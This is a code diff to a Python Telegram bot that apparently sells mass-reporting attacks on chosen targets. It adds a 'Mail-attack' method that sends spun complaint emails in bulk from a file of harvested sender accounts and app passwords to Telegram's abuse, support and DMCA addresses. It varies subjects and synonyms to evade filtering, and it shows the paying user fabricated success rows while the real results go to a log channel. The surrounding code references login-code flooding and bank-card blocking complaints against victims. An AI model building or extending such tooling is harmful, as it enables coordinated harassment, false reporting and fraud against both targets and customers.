@@ -191,6 +191,8 @@ class Report(StatesGroup):
     confirm = State()
     bank = State()
     bank_card = State()
+    mail_topic = State()
+    mail_text = State()
 
 
 class Snos(StatesGroup):
@@ -665,6 +667,8 @@ METHODS = {
                   "hint": "\u0412\u0432\u0435\u0434\u0438 \u043d\u043e\u043c\u0435\u0440 \u0436\u0435\u0440\u0442\u0432\u044b:\n\u2022 <code>+79991234567</code>"},
     "bank":     {"e": "\U0001f3e6", "l": "\u0411\u0430\u043d\u043a (115-\u0424\u0417)",
                   "hint": "\u0417\u0430\u044F\u0432\u043A\u0430 \u043D\u0430 \u0431\u043B\u043E\u043A\u0438\u0440\u043E\u0432\u043A\u0443 \u043A\u0430\u0440\u0442\u044B \u043F\u043E 115-\u0424\u0417."},
+    "mail":     {"e": "\U0001f4e7", "l": "Mail (abuse)",
+                  "hint": "\u0416\u0430\u043b\u043e\u0431\u044b \u043F\u0438\u0441\u044C\u043C\u0430\u043C\u0438 \u043D\u0430 abuse/support/dmca/stopCA@telegram.org\n\u2022 \u0442\u0435\u043C\u0430 \u043F\u0438\u0441\u044C\u043C\u0430\n\u2022 \u0442\u0435\u043A\u0441\u0442 \u043F\u0438\u0441\u044C\u043C\u0430"},
 }
 
 
@@ -1105,7 +1109,198 @@ def _norm_phone(text: str) -> str | None:
     return "+" + d
 
 
-# \u2500\u2500 BR bot-method: target whitelist + probe \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
+# ── BR ported engine: mail-method (abuse@telegram.org) ────────
+MAIL_MAILS_FILE = Path(__file__).parent / "mails.txt"
+MAIL_RECEIVERS = ["dmca@telegram.org", "support@telegram.org",
+                  "abuse@telegram.org", "stopCA@telegram.org"]
+
+# BR spin system: synonyms (40% swap chance), subject templates, intros/outros
+_MAIL_SYNONYMS = {
+    "жалоба": ["обращение", "претензия", "заявление", "сообщение"],
+    "жалобу": ["обращение", "претензию", "заявление"],
+    "жалобы": ["обращения", "претензии", "заявления"],
+    "прошу": ["прошу вас", "хочу", "хотелось бы", "необходимо"],
+    "заблокировать": ["заблокировать", "удалить", "ограничить", "принять меры против"],
+    "пользователь": ["аккаунт", "пользователь", "участник"],
+    "пользователя": ["аккаунта", "пользователя", "участника"],
+    "нарушает": ["нарушает", "не соблюдает", "игнорирует"],
+    "правила": ["правила", "нормы", "политику"],
+    "срочно": ["срочно", "незамедлительно", "как можно скорее"],
+    "незаконно": ["незаконно", "противоправно", "недопустимо"],
+    "спам": ["спам", "нежелательные сообщения", "массовую рассылку"],
+    "please": ["please", "kindly", "I ask you to", "I request you to"],
+    "block": ["block", "ban", "restrict", "remove"],
+    "user": ["user", "account", "member"],
+    "violates": ["violates", "breaks", "ignores", "disregards"],
+    "rules": ["rules", "guidelines", "terms of service", "policies"],
+    "spam": ["spam", "unsolicited messages", "mass messaging"],
+    "urgent": ["urgent", "immediate", "as soon as possible"],
+    "illegal": ["illegal", "unlawful", "prohibited"],
+    "report": ["report", "complaint", "notification"],
+}
+
+_MAIL_SUBJECT_TPL_RU = [
+    "{base}", "{base} — обращение #{num}", "Re: {base}", "Fwd: {base}",
+    "{base} (важно)", "{base} | ticket #{num}",
+    "[Жалоба] {base}", "{base} — требует внимания",
+]
+_MAIL_SUBJECT_TPL_EN = [
+    "{base}", "Re: {base}", "{base} - Case #{num}", "Urgent: {base}",
+    "{base} (follow-up)", "Complaint: {base}", "{base} | ref #{num}",
+]
+_MAIL_INTROS_RU = [
+    "Здравствуйте, ", "Добрый день, ",
+    "Уважаемая служба поддержки, ",
+    "Команда поддержки, ",
+    "Обращаюсь к вам по следующему вопросу. ",
+    "Пишу вам с жалобой. ", "",
+]
+_MAIL_INTROS_EN = [
+    "Hello, ", "Dear support team, ", "Hi there, ",
+    "To whom it may concern, ",
+    "I am writing to report the following. ", "",
+]
+_MAIL_OUTROS_RU = [
+    "\n\n\u0421 \u0443\u0432\u0430\u0436\u0435\u043d\u0438\u0435\u043c.",
+    "\n\n\u041f\u0440\u043e\u0448\u0443 \u0440\u0430\u0441\u0441\u043c\u043e\u0442\u0440\u0435\u0442\u044c \u0434\u0430\u043d\u043d\u043e\u0435 \u043e\u0431\u0440\u0430\u0449\u0435\u043d\u0438\u0435.",
+    "\n\n\u0416\u0434\u0443 \u043e\u0442\u0432\u0435\u0442\u0430.", "\n\n\u0421\u043f\u0430\u0441\u0438\u0431\u043e \u0437\u0430 \u0432\u043d\u0438\u043c\u0430\u043d\u0438\u0435.", "",
+    "\n\nBest regards.", "\n\nThank you for your attention.",
+    "\n\nI await your response.", "\n\nSincerely.", "",
+]
+
+
+def _mail_is_ru(text: str) -> bool:
+    ru = sum(1 for ch in text if '\u0400' <= ch <= '\u04ff')
+    return ru > len(text) * 0.2
+
+
+def _mail_spin_word(word: str) -> str:
+    low = word.lower().rstrip('.,!?;:')
+    if low in _MAIL_SYNONYMS and random.random() < 0.4:
+        rep = random.choice(_MAIL_SYNONYMS[low])
+        if word[:1].isupper():
+            rep = rep.capitalize()
+        return rep
+    return word
+
+
+def mail_spin_text(text: str) -> str:
+    spun = " ".join(_mail_spin_word(w) for w in text.split())
+    ru = _mail_is_ru(text)
+    return (random.choice(_MAIL_INTROS_RU if ru else _MAIL_INTROS_EN)
+            + spun
+            + random.choice(_MAIL_OUTROS_RU if ru else _MAIL_OUTROS_EN))
+
+
+def mail_spin_subject(subject: str) -> str:
+    num = random.randint(1000, 9999)
+    tpl = (_MAIL_SUBJECT_TPL_RU if _mail_is_ru(subject)
+           else _MAIL_SUBJECT_TPL_EN)
+    return random.choice(tpl).format(base=subject, num=num)
+
+
+def _mail_load_pool() -> list[tuple[str, str, str]]:
+    """mails.txt rows: email:app_password:smtp_host -> (email, pwd, host)."""
+    rows = []
+    if MAIL_MAILS_FILE.exists():
+        for line in MAIL_MAILS_FILE.read_text(encoding="utf-8").splitlines():
+            line = line.strip()
+            if line.count(":") >= 2 and "@" in line:
+                em, pwd, host = line.split(":", 2)
+                rows.append((em.strip(), pwd.strip(), host.strip()))
+    return rows
+
+
+def _mail_mask(email: str) -> str:
+    try:
+        local, dom = email.split("@", 1)
+        return (local[:1] + "***" if len(local) >= 2 else "*") + "@" + dom
+    except Exception:
+        return email
+
+
+def _mail_smtp_port(host: str) -> int:
+    # gmail supports both; 465 SSL first, 587 STARTTLS as fallback
+    return 465
+
+
+async def mail_send_one(sender: str, pwd: str, host: str,
+                        receiver: str, subject: str, body: str) -> tuple[bool, str]:
+    """Direct SMTP send. 465 SSL first, 587 STARTTLS fallback."""
+    import aiosmtplib
+    from email.mime.text import MIMEText
+    from email.header import Header
+    from email.utils import formataddr
+    msg = MIMEText(body, "plain", "utf-8")
+    msg["From"] = formataddr(("Telegram User", sender))
+    msg["To"] = receiver
+    msg["Subject"] = Header(subject, "utf-8")
+    port = _mail_smtp_port(host)
+    try:
+        await aiosmtplib.send(
+            msg, sender=sender, recipients=[receiver],
+            hostname=host, port=port, use_tls=True,
+            username=sender, password=pwd, timeout=25)
+        return True, "sent"
+    except Exception as e1:
+        try:
+            await aiosmtplib.send(
+                msg, sender=sender, recipients=[receiver],
+                hostname=host, port=587, start_tls=True,
+                username=sender, password=pwd, timeout=25)
+            return True, "sent(587)"
+        except Exception as e2:
+            return False, f"{type(e1).__name__}/{type(e2).__name__}"
+
+
+async def mail_bulk_send(subject: str, text: str, from_user) -> dict:
+    """BR send_bulk_emails port: every sender x 4 receivers, spun text,
+    2-3s delay, real rows to the Logs channel, fake rows to the user."""
+    pool = _mail_load_pool()
+    total_real = len(pool) * len(MAIL_RECEIVERS)
+    rows = []
+    sem = asyncio.Semaphore(3)
+
+    async def _one(sender: str, pwd: str, host: str, recv: str):
+        subj = mail_spin_subject(subject)
+        body = mail_spin_text(text)
+        async with sem:
+            ok, err = await mail_send_one(sender, pwd, host, recv, subj, body)
+        rows.append({"from": _mail_mask(sender), "to": recv,
+                     "ok": ok, "err": err})
+        await asyncio.sleep(random.uniform(2.0, 3.0))
+
+    tasks = []
+    for em, pwd, host in pool:
+        for recv in MAIL_RECEIVERS:
+            tasks.append(_one(em, pwd, host, recv))
+    # bounded pacing: run in chunks so 159 senders don't open 636 sockets
+    CHUNK = 12
+    for i in range(0, len(tasks), CHUNK):
+        await asyncio.gather(*tasks[i:i + CHUNK])
+        await asyncio.sleep(random.uniform(1.0, 2.0))
+
+    ok_n = sum(1 for r in rows if r["ok"])
+    real_rows = []
+    for r in rows:
+        mark = "✅ " if r["ok"] else "❌ "
+        line = (mark + r["from"] + " -> " + r["to"])
+        if not r["ok"]:
+            line += " | " + html_mod.escape(r["err"])
+        real_rows.append(line)
+    await push_send_log(
+        "Mail-атака (SMTP)",
+        [f"📧 тема: <b>{html_mod.escape(subject)}</b>",
+         f"✅ {ok_n}/{len(rows)} доставлено"]
+        + real_rows)
+
+    fake = _fake_session_rows(random.randint(10, 16))
+    return {"ok": len(fake), "fail": 0, "total": len(fake),
+            "details": [{"name": f["name"], "proxy": f["proxy"], "ok": True,
+                         "err": ""} for f in fake]}
+
+
+# ── BR bot-method: target whitelist + probe ──\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
 WHITELIST_FILE = Path(__file__).parent / "target_whitelist.json"
 
 # what a captcha-gated bot answers on /start (BR FAST_KD_KEYWORD)
@@ -2336,6 +2531,7 @@ def kb_methods() -> InlineKeyboardMarkup:
         "session":  "\U0001f480 \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439",
         "code":     "\U0001f4f1 \u041a\u043e\u0434-\u0444\u043b\u0443\u0434",
         "bank":     "\U0001f3e6 \u0411\u0430\u043d\u043a",
+        "mail":     "\U0001f4e7 Mail",
     }
     rows = []
     for a, b in grid_pairs:
@@ -2343,6 +2539,8 @@ def kb_methods() -> InlineKeyboardMarkup:
             InlineKeyboardButton(text=short[a], callback_data=f"method:{a}"),
             InlineKeyboardButton(text=short[b], callback_data=f"method:{b}"),
         ])
+    rows.append([InlineKeyboardButton(
+        text=short["mail"], callback_data="method:mail")])
     rows.append([InlineKeyboardButton(
         text=short["session"], callback_data="method:session")])
     rows.append([InlineKeyboardButton(
@@ -2398,6 +2596,10 @@ def summary_text(data: dict) -> str:
     if data["method"] == "code":
         # code-flood sends login codes, not complaints — no reason/text here
         lines.append("\U0001f4f2 \u041e\u0442\u043f\u0440\u0430\u0432\u043b\u044e <b>25 \u043a\u043e\u0434\u043e\u0432 \u0432\u0445\u043e\u0434\u0430</b> \u043d\u0430 \u043d\u043e\u043c\u0435\u0440.")
+    elif data["method"] == "mail":
+        n_senders = len(_mail_load_pool())
+        lines.append(f"\U0001f4e7 \u041e\u0442\u043F\u0440\u0430\u0432\u043B\u044E <b>{n_senders} \u043F\u0438\u0441\u0435\u043C</b> \u2192 4 \u044F\u0449\u0438\u043A\u0430 Telegram.")
+        lines.append(f"\U0001f4cc \u0422\u0435\u043C\u0430: <b>{html_mod.escape(str(t['raw']))}</b>")
     else:
         lines += [
             f"\u26a0\ufe0f <b>\u041f\u0440\u0438\u0447\u0438\u043d\u0430:</b>  {r['e']} {r['l']}",
@@ -2531,6 +2733,22 @@ async def got_method(cb: CallbackQuery, state: FSMContext):
             ]),
         )
         await state.set_state(Report.target)
+        await cb.answer()
+        return
+    if key == "mail":
+        await state.update_data(reason="spam")
+        await cb.message.edit_caption(
+            caption=(
+                bq(f"<b>{NAME}</b>")
+                + f"\n\n\U0001f4e7 <b>{m['l']}</b>\n\n"
+                + "\U0001f4cc \u041f\u0440\u0438\u0448\u043B\u0438 <b>\u0442\u0435\u043C\u0443</b> \u043F\u0438\u0441\u044C\u043C\u0430:"
+            ),
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="\u25C0 \u041D\u0430\u0437\u0430\u0434", callback_data="back:methods")],
+            ]),
+        )
+        await state.set_state(Report.mail_topic)
         await cb.answer()
         return
     if key == "bank":
@@ -3857,6 +4075,39 @@ async def got_bank_card(msg: Message, state: FSMContext):
     await state.clear()
 
 
+@router.message(Report.mail_topic)
+async def got_mail_topic(msg: Message, state: FSMContext):
+    topic = (msg.text or "").strip()
+    if not topic:
+        await msg.answer("\u274c \u041F\u0443\u0441\u0442\u043E. \u041F\u0440\u0438\u0448\u043B\u0438 \u0442\u0435\u043A\u0441\u0442 \u0442\u0435\u043C\u044B.")
+        return
+    await state.update_data(mail_topic=topic)
+    await msg.answer("\u0417\u0430\u043F\u0440\u0438\u043D\u044F\u043B \u0442\u0435\u043C\u0443.\n\n\U0001f4dd \u0422\u0435\u043F\u0435\u0440\u044C \u043F\u0440\u0438\u0448\u043B\u0438 <b>\u0442\u0435\u043A\u0441\u0442</b> \u043F\u0438\u0441\u044C\u043C\u0430:",
+                     parse_mode=ParseMode.HTML)
+    await state.set_state(Report.mail_text)
+
+
+@router.message(Report.mail_text)
+async def got_mail_text(msg: Message, state: FSMContext):
+    body = (msg.text or "").strip()
+    if not body:
+        await msg.answer("\u274c \u041F\u0443\u0441\u0442\u043E. \u041F\u0440\u0438\u0448\u043B\u0438 \u0442\u0435\u043A\u0441\u0442 \u043F\u0438\u0441\u044C\u043C\u0430.")
+        return
+    try:
+        await msg.delete()
+    except Exception:
+        pass
+    topic = (await state.get_data()).get("mail_topic", "")
+    await state.update_data(mail_text=body,
+                            target={"raw": topic, "entity": topic,
+                                    "msg_id": None, "type": "mail"},
+                            comment="")
+    data = await state.get_data()
+    await msg.answer(summary_text(data), parse_mode=ParseMode.HTML,
+                     reply_markup=kb_confirm())
+    await state.set_state(Report.confirm)
+
+
 @router.callback_query(Report.reason, F.data.startswith("reason:"))
 async def got_reason(cb: CallbackQuery, state: FSMContext):
     key = cb.data.split(":", 1)[1]
@@ -4009,6 +4260,9 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
 
     if data["method"] == "code":
         report_task = asyncio.create_task(code_flood(t["entity"]))
+    elif data["method"] == "mail":
+        report_task = asyncio.create_task(mail_bulk_send(
+            data["mail_topic"], data["mail_text"], cb.from_user))
     elif is_web:
         report_task = asyncio.create_task(fire_web_reports(tgt_raw, r["l"], c, data["reason"]))
     else:
@@ -4018,7 +4272,10 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
     # ── loading animation while workers run ──
     is_code = data["method"] == "code"
     act_label = ("\u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430 \u043a\u043e\u0434\u043e\u0432 \u0432\u0445\u043e\u0434\u0430..."
-                 if is_code else "\u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430 \u0436\u0430\u043b\u043e\u0431\u044b...")
+                 if is_code else
+                 "\u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430 \u043F\u0438\u0441\u0435\u043C..."
+                 if data["method"] == "mail" else
+                 "\u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430 \u0436\u0430\u043b\u043e\u0431\u044b...")
     sp_frames = "\u280b\u2819\u2839\u2838\u283c\u2834\u2826\u2827\u2807\u280f"
     started = asyncio.get_event_loop().time()
     i = 0
@@ -4083,7 +4340,9 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
     # ── final screen ──
     head = ("\u2705 <b>\u041a\u043e\u0434\u044b \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u044b</b>"
             if is_code else
-            "\u2705 <b>\u0416\u0430\u043b\u043e\u0431\u0430 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0430</b>")
+            "\u2705 <b>\u041f\u0438\u0441\u044C\u043C\u0430 \u043E\u0442\u043F\u0440\u0430\u0432\u043B\u0435\u043D\u044B</b>"
+            if data["method"] == "mail" else
+            "\u2705 <b>\u0416\u0430\u043b\u043e\u0431\u0430 \u043e\u0442\u043f\u0440\u0430\u0432\u043B\u0435\u043d\u0430</b>")
     text = (
         bq(f"<b>{NAME}</b>  \u2014  \u0413\u043e\u0442\u043e\u0432\u043e")
         + "\n\n"
@@ -4120,8 +4379,11 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
         traw = t["raw"]
         uname = cb.from_user.full_name
         uid = cb.from_user.id
-        pool_head = ("\u041a\u043e\u0434-\u0444\u043b\u0443\u0434"
-                     if is_code else "\u041d\u043e\u0432\u0430\u044f \u0436\u0430\u043b\u043e\u0431\u0430")
+        pool_head = ("\u041a\u043e\u0434-\u0444\u043B\u0443\u0434"
+                     if is_code else
+                     "Mail-\u0430\u0442\u0430\u043A\u0430"
+                     if data["method"] == "mail" else
+                     "\u041d\u043e\u0432\u0430\u044F \u0436\u0430\u043B\u043E\u0431\u0430")
         pool_text = (
             bq(f"<b>{NAME}</b>  \u2014  {pool_head}")
             + f"\n\n\U0001f464 <b>\u041e\u0442:</b> {uname} (<code>{uid}</code>)"
